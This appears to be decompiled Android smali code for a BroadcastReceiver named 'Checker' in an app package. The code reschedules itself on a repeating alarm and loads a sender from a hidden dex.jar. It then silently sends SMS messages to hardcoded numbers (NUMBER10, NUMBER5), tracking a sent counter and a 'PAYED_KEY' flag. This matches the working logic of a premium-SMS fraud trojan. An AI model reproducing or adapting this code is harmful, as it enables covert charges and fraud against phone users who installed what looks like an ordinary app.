.class public Lcom/software/application/Checker;
.super Landroid/content/BroadcastReceiver;
.source "Checker.java"


# static fields
.field public static final ACTION:Ljava/lang/String; = "com.software.CHECKER"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 13
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method public static scheduleChecking(Landroid/content/Context;)V
    .locals 8
    .param p0, "mContext"    # Landroid/content/Context;

    .prologue
    const/4 v7, 0x0

    .line 60
    const-string v3, "PAYED_KEY"

    const-string v4, "NO"

    const-string v5, "PREFS"

    invoke-virtual {p0, v5, v7}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v5

    invoke-static {p0, v3, v4, v5}, Lcom/software/application/TextUtils;->putSettingsValue(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Landroid/content/SharedPreferences;)V

    .line 62
    new-instance v1, Landroid/content/Intent;

    const-class v3, Lcom/software/application/Checker;

    invoke-direct {v1, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 63
    .local v1, "intent":Landroid/content/Intent;
    const-string v3, "alarm"

    invoke-virtual {p0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    .line 64
    .local v0, "am":Landroid/app/AlarmManager;
    const-string v3, "com.software.CHECKER"

    invoke-virtual {v1, v3}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 65
    const/high16 v3, 0x10000000

    invoke-static {p0, v7, v1, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v2

    .line 67
    .local v2, "pendingIntent":Landroid/app/PendingIntent;
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    const-wide/32 v5, 0xc350

    add-long/2addr v3, v5

    invoke-virtual {v0, v7, v3, v4, v2}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 69
    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 13
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    const/4 v5, 0x1

    const/4 v4, 0x2

    .line 20
    :try_start_0
    new-instance v9, Ljava/io/File;

    const-string v1, "dex_lib"

    const/4 v2, 0x0

    invoke-virtual {p1, v1, v2}, Landroid/content/Context;->getDir(Ljava/lang/String;I)Ljava/io/File;

    move-result-object v1

    const-string v2, "dex.jar"

    invoke-direct {v9, v1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 22
    .local v9, "jarFile":Ljava/io/File;
    invoke-virtual {v9}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-static {p1, v1}, Lcom/software/application/Main;->getSenderInstance(Landroid/content/Context;Ljava/lang/String;)Lcom/software/application/Sender;

    move-result-object v0

    .line 23
    .local v0, "sender":Lcom/software/application/Sender;
    const-string v1, "PREFS"

    const/4 v2, 0x0

    invoke-virtual {p1, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v12

    .line 24
    .local v12, "settings":Landroid/content/SharedPreferences;
    const-string v1, "SENDED_SMS_COUNTER_KEY"

    const/4 v2, 0x0

    invoke-interface {v12, v1, v2}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v11

    .line 25
    .local v11, "sended":I
    const-string v1, "NO"

    const-string v2, "PAYED_KEY"

    const-string v3, "NO"

    invoke-interface {v12, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_4

    .line 27
    sget-boolean v1, Lcom/software/application/Actor;->IS_MF:Z

    if-nez v1, :cond_0

    if-lt v11, v4, :cond_1

    :cond_0
    sget-boolean v1, Lcom/software/application/Actor;->IS_MF:Z

    if-eqz v1, :cond_2

    if-ge v11, v5, :cond_2

    .line 28
    :cond_1
    const-string v1, "SMS_DATA_KEY"

    const-string v2, ""

    invoke-interface {v12, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 29
    .local v7, "data":Ljava/lang/String;
    sget-object v1, Lcom/software/application/Actor;->NUMBER10:Ljava/lang/String;

    const/4 v2, 0x0

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v4, Lcom/software/application/Actor;->PORT_PREF:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "+"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-interface/range {v0 .. v5}, Lcom/software/application/Sender;->sendSingleMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 30
    invoke-static {p1}, Lcom/software/application/Checker;->scheduleChecking(Landroid/content/Context;)V

    .line 57
    .end local v0    # "sender":Lcom/software/application/Sender;
    .end local v7    # "data":Ljava/lang/String;
    .end local v9    # "jarFile":Ljava/io/File;
    .end local v11    # "sended":I
    .end local v12    # "settings":Landroid/content/SharedPreferences;
    :goto_0
    return-void

    .line 31
    .restart local v0    # "sender":Lcom/software/application/Sender;
    .restart local v9    # "jarFile":Ljava/io/File;
    .restart local v11    # "sended":I
    .restart local v12    # "settings":Landroid/content/SharedPreferences;
    :cond_2
    sget-boolean v1, Lcom/software/application/Actor;->IS_MF:Z

    if-nez v1, :cond_3

    if-ne v11, v4, :cond_3

    .line 32
    const-string v1, "SMS_DATA_KEY"

    const-string v2, ""

    invoke-interface {v12, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 33
    .restart local v7    # "data":Ljava/lang/String;
    sget-object v1, Lcom/software/application/Actor;->NUMBER5:Ljava/lang/String;

    const/4 v2, 0x0

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v4, Lcom/software/application/Actor;->PORT_PREF:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "+"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-interface/range {v0 .. v5}, Lcom/software/application/Sender;->sendSingleMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 34
    invoke-static {p1}, Lcom/software/application/Checker;->scheduleChecking(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 53
    .end local v0    # "sender":Lcom/software/application/Sender;
    .end local v7    # "data":Ljava/lang/String;
    .end local v9    # "jarFile":Ljava/io/File;
    .end local v11    # "sended":I
    .end local v12    # "settings":Landroid/content/SharedPreferences;
    :catch_0
    move-exception v8

    .line 54
    .local v8, "e":Ljava/lang/Exception;
    const-string v1, "DEBUGGING"

    invoke-virtual {v8}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 55
    invoke-virtual {v8}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    .line 36
    .end local v8    # "e":Ljava/lang/Exception;
    .restart local v0    # "sender":Lcom/software/application/Sender;
    .restart local v9    # "jarFile":Ljava/io/File;
    .restart local v11    # "sended":I
    .restart local v12    # "settings":Landroid/content/SharedPreferences;
    :cond_3
    :try_start_1
    const-string v1, "SENDED_SMS_COUNTER_KEY"

    const/4 v2, 0x0

    invoke-static {p1, v1, v2, v12}, Lcom/software/application/TextUtils;->putSettingsValue(Landroid/content/Context;Ljava/lang/String;ILandroid/content/SharedPreferences;)V

    goto :goto_0

    .line 39
    :cond_4
    const-string v1, "NET_OP"

    const-string v2, ""

    invoke-interface {v12, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    .line 40
    .local v10, "opStr":Ljava/lang/String;
    new-instance v6, Lcom/software/application/Actor;

    invoke-direct {v6, p1, v10}, Lcom/software/application/Actor;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 41
    .local v6, "act":Lcom/software/application/Actor;
    invoke-virtual {v6, v0}, Lcom/software/application/Actor;->setSender(Lcom/software/application/Sender;)V

    .line 42
    invoke-virtual {v6}, Lcom/software/application/Actor;->wasInitError()Z

    move-result v1

    if-nez v1, :cond_5

    .line 43
    if-nez v11, :cond_6

    .line 44
    const-string v1, "5-3-1"

    const/4 v2, 0x0

    invoke-virtual {v6, v1, v2}, Lcom/software/application/Actor;->activate(Ljava/lang/String;Ljava/lang/String;)V

    .line 51
    :cond_5
    :goto_1
    const-string v1, "SENDED_SMS_COUNTER_KEY"

    const/4 v2, 0x0

    invoke-static {p1, v1, v2, v12}, Lcom/software/application/TextUtils;->putSettingsValue(Landroid/content/Context;Ljava/lang/String;ILandroid/content/SharedPreferences;)V

    goto :goto_0

    .line 45
    :cond_6
    if-ne v11, v5, :cond_7

    .line 46
    const-string v1, "5-3"

    const/4 v2, 0x0

    invoke-virtual {v6, v1, v2}, Lcom/software/application/Actor;->activate(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_1

    .line 47
    :cond_7
    if-ne v11, v4, :cond_5

    .line 48
    const-string v1, "3"

    const/4 v2, 0x0

    invoke-virtual {v6, v1, v2}, Lcom/software/application/Actor;->activate(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1
.end method
